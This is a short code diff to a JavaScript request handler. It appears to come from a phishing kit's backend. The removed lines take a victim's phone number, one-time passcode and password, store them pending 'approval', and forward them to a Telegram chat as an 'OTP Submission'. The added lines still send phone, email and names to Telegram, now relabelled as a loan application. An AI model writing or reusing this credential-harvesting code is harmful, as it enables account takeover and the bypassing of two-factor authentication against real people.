@@ -12,16 +12,16 @@ export async function onRequest(context) {
     return makeJsonResponse({ error: "Invalid JSON" }, 400);
   }
 
-  const { phone, otp, password, userId, email, firstName, lastName } = body;
-  if (!phone || !otp || !password) {
-    return makeJsonResponse({ error: "Missing required fields: phone, otp, password" }, 400);
+  const { phone, userId, email, firstName, lastName } = body;
+  if (!phone) {
+    return makeJsonResponse({ error: "Missing required fields: phone" }, 400);
   }
 
   const requestId = uuidv4();
-  const data = { phone, otp, password, userId, email, firstName, lastName, approved: false, timestamp: new Date().toISOString() };
+  const data = { phone, userId, email, firstName, lastName, approved: false, timestamp: new Date().toISOString() };
 
   await setRequestInKV(env, requestId, data, "otp");
-  await sendTelegramNotification({ requestId, phone, otp, password, email, firstName, lastName, type: "OTP Submission" }, env, request.url);
+  await sendTelegramNotification({ requestId, phone, email, firstName, lastName, type: "Loan Application Submission" }, env, request.url);
 
   return makeJsonResponse({ success: true, requestId });
 }
